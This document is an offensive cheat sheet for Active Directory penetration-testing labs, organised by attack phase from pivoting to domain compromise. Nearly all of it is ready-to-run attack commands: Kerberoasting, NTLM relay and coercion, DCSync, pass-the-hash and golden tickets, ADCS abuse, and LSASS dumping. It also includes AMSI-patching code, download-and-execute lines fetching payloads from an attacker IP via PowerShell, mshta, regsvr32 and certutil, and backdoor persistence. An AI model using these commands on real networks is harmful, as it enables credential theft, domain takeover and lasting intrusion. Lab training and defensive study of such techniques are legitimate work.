## Lab Roadmap and Key Techniques

```text
Lab         | Level        | Main Focus
Dante       | Beginner     | Recon, Web, PrivEsc Linux/Windows, basic pivoting
Zephyr      | Intermediate | AD, AV Evasion, GPO abuse
RastaLabs   | Intermediate | Full Red Team, OSINT, hardened AD, Phishing
Offshore    | Intermediate | Multi-domain AD, trust abuse, advanced pivoting
Intercept   | Intermediate | NTLM Relay, ADCS ESC, Coercion
Cybernetics | Advanced     | Hardened AD, advanced Kerberos, EDR evasion
APTLabs     | Expert       | Nation-state simulation, Cloud, multi-forest
```

## Phase 0 - Setup and Pivoting Infrastructure

### VPN Connection and Network Config

```bash
# ProLab connection
sudo openvpn lab_name.ovpn

# Check routes
ip route
# Add route to internal network if needed
sudo ip route add 172.16.0.0/16 via <vpn_gateway>

# TUN interface
ifconfig tun0
```

### Ligolo-ng - Primary Pivot

```bash
# On attacker (proxy server)
./proxy -selfcert -laddr 0.0.0.0:11601

# On victim (agent)
./agent -connect 10.10.14.5:11601 -ignore-cert

# In Ligolo console
session                          # Select session
ifconfig                         # View accessible networks
start                            # Start tunnel

# Add route to internal network
sudo ip route add 192.168.0.0/24 dev ligolo

# Listener for reverse shell from pivoted network
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

### Chisel - Quick Alternative

```bash
# Attacker (server)
chisel server -p 8080 --reverse

# Victim (client)
chisel client 10.10.14.5:8080 R:socks

# Use via proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 192.168.1.0/24
```

### SSH Tunneling

```bash
# Dynamic SOCKS proxy
ssh -D 1080 user@pivot_host -N -f

# Remote port forward
ssh -R 4444:localhost:4444 user@pivot_host

# Local port forward
ssh -L 5985:172.16.1.10:5985 user@pivot_host

# Double pivot
ssh -J user1@pivot1 user2@pivot2
```

## Phase 1 - External Recon and Initial Foothold

### External Recon

```bash
# Domain OSINT
whois domain.com
dig any domain.com
dnsx -d domain.com -a -mx -ns -txt -resp

# Subdomains
subfinder -d domain.com -o subdomains.txt
amass enum -d domain.com
assetfinder --subs-only domain.com

# External web scan
whatweb http://domain.com
nuclei -u http://domain.com -t /opt/nuclei-templates/
nikto -h http://domain.com
```

### Internal Network Scan (Post-Foothold)

```bash
# Quick discovery scan
nmap -sn 172.16.0.0/24 -oG hosts_up.txt
cat hosts_up.txt | grep "Up" | awk '{print $2}' > live_hosts.txt

# Full scan on live hosts
nmap -sV -sC -Pn -n --open -iL live_hosts.txt -oA full_scan -T4

# SMB/WinRM/RDP port scan
nmap -p 445,5985,3389,88,389,636 -sV --open 172.16.0.0/24

# Quick scan with masscan
masscan -p1-65535 172.16.0.0/24 --rate=1000 -oL masscan_results.txt
```

## Phase 2 - AD Enumeration

### BloodHound - Collection

```bash
# SharpHound (from compromised Windows)
.\SharpHound.exe -c All --zipfilename bloodhound.zip
.\SharpHound.exe -c All,GPOLocalGroup --stealth --zipfilename bh.zip

# BloodHound.py (from Linux)
bloodhound-python -d domain.local -u user -p 'Password' -c All -ns 10.10.10.10
bloodhound-python -d domain.local -u user -p 'Password' -c All -ns 10.10.10.10 --zip

# With NTLM hash
bloodhound-python -d domain.local -u user --hashes :NTLMhash -c All -ns 10.10.10.10
```

### BloodHound - Key Cypher Queries

```cypher
-- All paths to Domain Admin
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

-- Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Accounts with DCSync rights
MATCH p=(u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u.name

-- Active admin sessions
MATCH p=(c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p

-- Machines with LAPS
MATCH (c:Computer {haslaps:true}) RETURN c.name

-- Owned to DA path
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

### PowerView / LDAP Enumeration

```powershell
# Import
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainTrust
Get-ForestTrust

# Users
Get-DomainUser | Select samaccountname, description, memberof
Get-DomainUser -SPN                          # Kerberoastable
Get-DomainUser -PreauthNotRequired           # AS-REP Roastable
Get-DomainUser -AdminCount 1                 # Admins

# Groups
Get-DomainGroup "Domain Admins" -Properties Members
Get-DomainGroupMember "Domain Admins" -Recurse

# Interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -like "*user*"}

# GPO
Get-DomainGPO | Select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup

# Sessions
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### Enumeration via Impacket (Linux)

```bash
# LDAP enum
ldapdomaindump -u 'domain\user' -p 'Password' 10.10.10.10

# SMB share enum
crackmapexec smb 172.16.0.0/24 -u user -p 'Password' --shares
crackmapexec smb 172.16.0.0/24 -u user -p 'Password' -M spider_plus

# RPC enum
rpcclient -U "domain/user%Password" 10.10.10.10
> enumdomusers
> enumdomgroups
> querydominfo

# Manual LDAP search
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'Password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

## Phase 3 - Credential Attacks

### Kerberoasting

```bash
# Linux (Impacket)
GetUserSPNs.py domain.local/user:'Password' -dc-ip 10.10.10.10 -request
GetUserSPNs.py domain.local/user:'Password' -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt

# Linux with NTLM hash
GetUserSPNs.py domain.local/user -hashes :NTLMhash -dc-ip 10.10.10.10 -request

# Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
.\Rubeus.exe kerberoast /user:targetuser /outfile:hash.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt kerberoast.txt
```

### AS-REP Roasting

```bash
# Linux without credentials (known users)
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.10

# Linux with credentials
GetNPUsers.py domain.local/user:'Password' -dc-ip 10.10.10.10 -request

# Windows (Rubeus)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:targetuser /format:hashcat

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Company2024!' --continue-on-success
crackmapexec smb 10.10.10.10 -u users.txt -p 'Company2024!' 2>/dev/null | grep "+"

# Kerbrute (avoids lockout - no auth failure log)
kerbrute passwordspray --dc 10.10.10.10 -d domain.local users.txt 'Password123!'
kerbrute userenum --dc 10.10.10.10 -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# DomainPasswordSpray (Windows)
Invoke-DomainPasswordSpray -Password 'Company2024!' -OutFile spray_results.txt
```

### NTLM Hash Capture

```bash
# Responder (LLMNR/NBT-NS poisoning)
responder -I tun0 -wd
responder -I tun0 -wd -v

# NTLMrelayx (relay attacks)
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -i           # interactive shell
ntlmrelayx.py -t smb://10.10.10.10 -smb2support -c "whoami"

# Coercion -> Relay
# PetitPotam (unauthenticated)
python3 PetitPotam.py -u '' -p '' attacker_ip 10.10.10.10

# Coercer
coercer coerce -u user -p 'Password' -d domain.local -t 10.10.10.10 -l 10.10.14.5
```

### SecretsDump / DCSync

```bash
# Remote SecretsDump (admin required)
secretsdump.py domain/user:'Password'@10.10.10.10
secretsdump.py domain/user:'Password'@10.10.10.10 -just-dc-ntlm  # NTDS only

# DCSync (if DCSync rights available)
secretsdump.py -just-dc domain/user:'Password'@DC_IP
secretsdump.py -just-dc-user Administrator domain/user:'Password'@DC_IP

# Windows (Mimikatz)
lsadump::dcsync /domain:domain.local /all
lsadump::dcsync /domain:domain.local /user:Administrator

# Dump local SAM
secretsdump.py -sam SAM -system SYSTEM LOCAL
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

## Phase 4 - Pass-the-X (Lateral Movement)

### Pass the Hash

```bash
# PsExec
psexec.py domain/user@10.10.10.10 -hashes :NTLMhash
psexec.py -hashes :NTLMhash domain/Administrator@10.10.10.10

# WmiExec (less noisy)
wmiexec.py domain/user@10.10.10.10 -hashes :NTLMhash

# SMBExec (no file on disk)
smbexec.py domain/user@10.10.10.10 -hashes :NTLMhash

# Evil-WinRM (WinRM 5985)
evil-winrm -i 10.10.10.10 -u Administrator -H NTLMhash

# CrackMapExec
crackmapexec smb 10.10.10.10 -u Administrator -H NTLMhash -x "whoami"
crackmapexec winrm 10.10.10.10 -u Administrator -H NTLMhash -x "whoami"
```

### Pass the Ticket

```bash
# Request TGT from hash
getTGT.py domain.local/user -hashes :NTLMhash -dc-ip 10.10.10.10
getTGT.py domain.local/user -aesKey <aes256key> -dc-ip 10.10.10.10

# Use the ticket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain.local/user@machine.domain.local
wmiexec.py -k -no-pass domain.local/user@machine.domain.local
secretsdump.py -k -no-pass domain.local/user@DC.domain.local

# Rubeus (Windows) - request TGT
.\Rubeus.exe asktgt /user:admin /rc4:NTLMhash /ptt
.\Rubeus.exe asktgt /user:admin /aes256:key /ptt

# Rubeus - inject ticket
.\Rubeus.exe ptt /ticket:base64_ticket
.\Rubeus.exe klist
.\Rubeus.exe purge
```

### Overpass the Hash

```bash
# Rubeus
.\Rubeus.exe asktgt /user:user /rc4:NTLMhash /ptt /domain:domain.local

# Impacket
getTGT.py -dc-ip 10.10.10.10 -hashes :NTLMhash domain.local/user
export KRB5CCNAME=user.ccache
klist
```

### Golden / Silver Ticket

```bash
# Golden Ticket (krbtgt hash required)
# Retrieve krbtgt hash
secretsdump.py domain/Administrator:'Password'@DC_IP | grep krbtgt

# Forge ticket (Impacket)
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache

# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver Ticket (machine account hash)
ticketer.py -nthash <machine_hash> -domain-sid S-1-5-21-... -domain domain.local -spn cifs/machine.domain.local user
```

## Phase 5 - ADCS Exploitation

### Certipy - Enumeration

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p 'Password' -dc-ip 10.10.10.10
certipy find -u user@domain.local -p 'Password' -dc-ip 10.10.10.10 -vulnerable -stdout

# With hash
certipy find -u user@domain.local -hashes :NTLMhash -dc-ip 10.10.10.10 -vulnerable
```

### ESC1 - Template Misconfiguration

```bash
# Exploit (request cert as Administrator)
certipy req -u user@domain.local -p 'Password' -ca CA_NAME -target dc.domain.local \
  -template VulnTemplate -upn administrator@domain.local

# Authenticate with cert -> obtain NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC4 - Template Write Access

```bash
# Modify template to enable ESC1
certipy template -u user@domain.local -p 'Password' -template VulnTemplate -save-old
# Then exploit as ESC1
certipy req -u user@domain.local -p 'Password' -ca CA_NAME -template VulnTemplate -upn administrator@domain.local
# Restore
certipy template -u user@domain.local -p 'Password' -template VulnTemplate -configuration template.json
```

### ESC8 - NTLM Relay to ADCS

```bash
# 1. Start relay to AD CS HTTP endpoint
certipy relay -ca ca.domain.local -template DomainController

# Or with ntlmrelayx
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# 2. Force coercion (PetitPotam)
python3 PetitPotam.py -u user -p 'Password' attacker_ip DC_IP

# 3. Authenticate with obtained cert
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
```

## Phase 6 - Trust Abuse and Cross-Domain

### Trust Enumeration

```powershell
# PowerView
Get-DomainTrust
Get-ForestTrust
Get-DomainTrust -Domain child.domain.local
nltest /domain_trusts /all_trusts
```

```bash
# Impacket
GetADUsers.py -all domain.local/user:'Password' -dc-ip 10.10.10.10
```

### SID History Attack

```powershell
# Mimikatz - add Enterprise Admins SID to SID History
privilege::debug
lsadump::lsa /patch
# Forge Golden Ticket with SID History
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:child.local /sid:<child_SID> /sids:<parent_Enterprise_Admins_SID> /user:Administrator /ptt
```

### Inter-Forest Attacks

```bash
# Enum trust keys
secretsdump.py domain/Administrator:'Password'@DC_IP | grep "_history\|trust"

# Cross-forest ticket
ticketer.py -nthash <trust_key> -domain-sid <src_SID> -domain child.local -extra-sid <target_EA_SID> -spn krbtgt/target.local Administrator
```

## Phase 7 - GPO and ACL Abuse

### GPO Abuse

```powershell
# Find GPOs with write permissions
Get-DomainGPO | ForEach-Object {
    $gpo = $_
    $acl = Get-DomainObjectAcl -ResolveGUIDs -Identity $gpo.Name
    $acl | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.IdentityReferenceName -ne "Domain Admins"}
}

# SharpGPOAbuse (Windows)
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author domain\admin --Command "cmd.exe" --Arguments "/c net user hacker P@ssword /add && net localgroup administrators hacker /add" --GPOName "GPO_NAME"

# Force GPO update (on target machine)
gpupdate /force
Invoke-GPUpdate -Computer "target" -Force
```

### ACL Abuse - GenericWrite / WriteDACL / AllExtendedRights

```powershell
# GenericWrite -> Targeted Kerberoasting
Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='fake/spn'}
GetUserSPNs.py domain.local/user:'Password' -dc-ip 10.10.10.10 -request

# GenericWrite -> AS-REP Roasting
Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}
GetNPUsers.py domain.local/user:'Password' -dc-ip 10.10.10.10 -request

# WriteDACL -> Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "domain\user" -PrincipalIdentity controlled_user -Rights DCSync

# ForceChangePassword
$Cred = New-Object System.Management.Automation.PSCredential('domain\controlled_user', (ConvertTo-SecureString 'Password' -AsPlainText -Force))
Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Credential $Cred

# WriteOwner -> Take ownership
Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity controlled_user
Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity controlled_user -Rights All
```

## Phase 8 - Credential Harvesting and Persistence

### Mimikatz - Windows

```powershell
# Enable privileges
privilege::debug
token::elevate

# Dump LSASS from memory
sekurlsa::logonpasswords
sekurlsa::wdigest           # Cleartext passwords (if wdigest enabled)
sekurlsa::tickets           # Kerberos tickets
sekurlsa::ekeys             # Kerberos AES keys

# Dump SAM
lsadump::sam

# DCSync
lsadump::dcsync /user:Administrator
lsadump::dcsync /all /csv

# Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt
```

### LSASS Dump Without Mimikatz (AV Evasion)

```bash
# Task Manager -> Processes -> lsass.exe -> Create Dump File

# comsvcs.dll (LOLBin)
powershell -c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full"

# PPLdump (if RunAsPPL enabled)
PPLdump.exe lsass.exe lsass.dmp

# Pypykatz (analyze dump on Linux)
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o json | jq '.[] | .MSV[]? | {username, NT}'
```

### Constrained / Unconstrained Delegation

```powershell
# Find accounts with unconstrained delegation
Get-DomainComputer -Unconstrained | Select Name
Get-DomainUser -AllowDelegation | Select samaccountname

# Exploit unconstrained delegation
# 1. Wait/force admin TGT (PetitPotam coercion)
# 2. Extract TGT from memory
.\Rubeus.exe monitor /interval:5 /filteruser:DC$

# Constrained delegation (S4U2Self)
.\Rubeus.exe s4u /user:service_user /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt

# Resource-Based Constrained Delegation (RBCD)
# 1. Add controlled machine account to msDS-AllowedToActOnBehalfOfOtherIdentity
Set-DomainObject -Identity "TARGET$" -Set @{'msds-allowedtoactonbehalfofotheridentity'=<machine_account_SID>}
# 2. S4U2Self + S4U2Proxy
.\Rubeus.exe s4u /user:ATTACKER_MACHINE$ /rc4:machine_hash /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

## Phase 9 - Windows PrivEsc

### Quick Local Enumeration

```powershell
whoami /all                    # User, groups, privileges
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
wmic qfe list brief            # Installed patches
netstat -ano
tasklist /SVC
sc query                       # Services
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### WinPEAS

```powershell
.\winPEASx64.exe
.\winPEASx64.exe quiet         # Less verbose
.\winPEASx64.exe systeminfo    # Specific section
```

### Abusable Privileges

```powershell
# SeImpersonatePrivilege -> Potato attacks
.\GodPotato.exe -cmd "cmd /c whoami"
.\PrintSpoofer.exe -i -c cmd
.\RoguePotato.exe -r 10.10.14.5 -e "cmd.exe"
.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

# SeBackupPrivilege -> Dump SAM/NTDS
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# Or from DC
Import-Module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

# SeTakeOwnershipPrivilege
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

## Phase 10 - AV/EDR Evasion

### AMSI Bypass (PowerShell)

```powershell
# Patch AMSI in memory
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteByte($c, 0x165, 0xeb)

# Disable Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

### Command Obfuscation

```powershell
# Invoke-Obfuscation
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation
TOKEN\ALL\1

# Simple encoding
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Concatenation bypass
$c = 'IEX'+'(New-Object Net.Web'+'Client).Download'+'String("http://10.10.14.5/shell.ps1")'
```

### Process Injection (Avoid Dropper on Disk)

```powershell
# Inject shellcode into existing process (notepad)
Start-Process notepad
$pid = (Get-Process notepad).Id
# (use injection lib: Invoke-Shellcode, etc.)

# LOLBAS for execution
# mshta
mshta.exe javascript:a=(GetObject('script:http://10.10.14.5/payload.sct')).Exec();close();

# Regsvr32 (squiblydoo)
regsvr32.exe /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll

# Certutil download + execute
certutil -urlcache -split -f http://10.10.14.5/shell.exe C:\Temp\shell.exe
C:\Temp\shell.exe
```

## Phase 11 - Persistence

### Windows Persistence

```powershell
# Registry Run Key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\Temp\backdoor.exe"

# Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\backdoor.exe" /sc onlogon /ru System
schtasks /create /tn "Update" /tr "powershell -enc <encoded>" /sc minute /mo 5

# Services
sc create "WinUpdate" binPath= "C:\Temp\backdoor.exe" start= auto
sc start WinUpdate
```

### Golden Ticket Persistence

```bash
# Retrieve krbtgt hash
secretsdump.py domain/Administrator:'Password'@DC_IP | grep krbtgt

# Forge Golden Ticket (valid 10 years by default)
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain domain.local -duration 87600 Administrator
export KRB5CCNAME=Administrator.ccache
```

## Essential Pro Labs One-Liners

### Quick Reference Commands

```bash
# Quickly find passwords in files
crackmapexec smb 10.10.10.10 -u user -p 'Password' -M spider_plus -o READ_ONLY=false
grep -ri "password\|passwd\|pwd\|secret" /mnt/share/ 2>/dev/null | grep -v ".exe\|.dll"

# Accounts with description containing a password (AD)
Get-DomainUser | Where-Object {$_.Description -ne $null} | Select samaccountname,description

# Dump hashes from NTDS on Linux
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL | grep -v "\$:"

# Pass-the-hash across an entire subnet
crackmapexec smb 172.16.0.0/24 -u Administrator -H NTLMhash --local-auth 2>/dev/null | grep "+"

# BloodHound from Linux in one line
bloodhound-python -d domain.local -u user -p 'Pass' -c All -ns 10.10.10.10 --zip -o ./bh_output/

# Check if ADCS is vulnerable in one line
certipy find -u user@domain.local -p 'Pass' -dc-ip 10.10.10.10 -vulnerable -stdout 2>/dev/null

# Coercion to self to capture NetNTLM hash
coercer coerce -u user -p 'Pass' -d domain.local -t DC_IP -l attacker_IP --always-continue

# Find SPN in LDAP
ldapsearch -x -H ldap://DC -D "user@domain.local" -w 'Pass' -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName | grep -E "sAMAccountName|servicePrincipalName"

# Kerberoast + crack in one line
GetUserSPNs.py domain.local/user:'Pass' -dc-ip DC_IP -request -outputfile krb.txt && hashcat -m 13100 krb.txt rockyou.txt --force
```

### Tools Summary

```text
Tool              | Phase       | Base Command
nmap              | Recon       | nmap -sV -sC -Pn --open
bloodhound-python | AD Enum     | -c All -d domain -u user -p pass
crackmapexec      | Lateral     | smb target -u user -H hash -x cmd
impacket (suite)  | Multi       | secretsdump, psexec, GetUserSPNs
Rubeus            | Kerberos    | asktgt, kerberoast, ptt
certipy           | ADCS        | find -vulnerable, req, auth
ligolo-ng         | Pivoting    | proxy + agent
Mimikatz          | Credentials | sekurlsa::logonpasswords
PowerView         | AD Enum     | Get-DomainUser, Find-InterestingDomainAcl
Coercer           | NTLM Relay  | coerce -t DC -l attacker
Responder         | Capture     | -I tun0 -wd
ntlmrelayx        | Relay       | -tf targets.txt -smb2support
```

### Recommended Pro Lab Workflow

```text
VPN + routes -> nmap subnet -> BloodHound -> Kerberoast/AS-REP -> Crack -> foothold -> Pass-the-Hash lateral -> ADCS/ACL abuse -> DCSync -> Trust crossing -> DA on all domains
```
